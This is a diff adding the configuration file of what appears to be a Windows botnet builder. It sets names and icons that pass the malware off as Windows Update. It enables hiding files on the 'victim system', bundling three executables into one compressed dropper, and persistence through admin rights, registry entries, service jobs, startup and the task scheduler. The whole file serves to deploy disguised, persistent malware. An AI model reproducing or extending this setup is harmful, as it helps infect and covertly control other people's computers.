@@ -1,0 +1,50 @@
+# Add Icons in executables
+add_icons_in_executables="True"
+
+# Executables/script Name
+## Botnet Name
+botnet_Name="service"
+
+## Scheduler Hidder Name
+scheduler_hidder_Name="update"
+
+## Scheduler Name
+scheduler_Name="WindowsUpdate"
+
+# Command Storage File Name
+exec_fileName="updateDetails"
+
+# Icons to use
+## Icon for scheduler Hidder
+scheduler_hidder_IconLocation="assets/images/windows_update.ico"
+
+## Icon for scheduler
+scheduler_IconLocation="assets/images/win_XP_icon-480.ico"
+
+## Icon for botnet
+botnet_IconLocation="assets/images/service.ico"
+
+
+# Make compressed files and add all three executables in 1 file | Decompress->Execute->start | in one file
+generate_executables="True"
+generate_compressed_file="True"
+
+
+# Victim System Details
+
+victim_System="WIN"
+hide_files="True"
+
+## Windows Details
+win_os="windows"
+win_gen_executable="True"
+win_locations_to_use=["HOME", "DESKTOP", "DOCUMENTS", "DOWNLOADS", "PICTURES", "MUSIC", "VIDEOS", "ROAMING"]
+
+### Administrators functions for scheduler service installation
+
+win_run_as_admin="True"
+win_add_to_registry="True"
+win_add_to_service_jobs="True"
+win_add_to_startup="True"
+win_set_scheduler_service_enable="True"
+
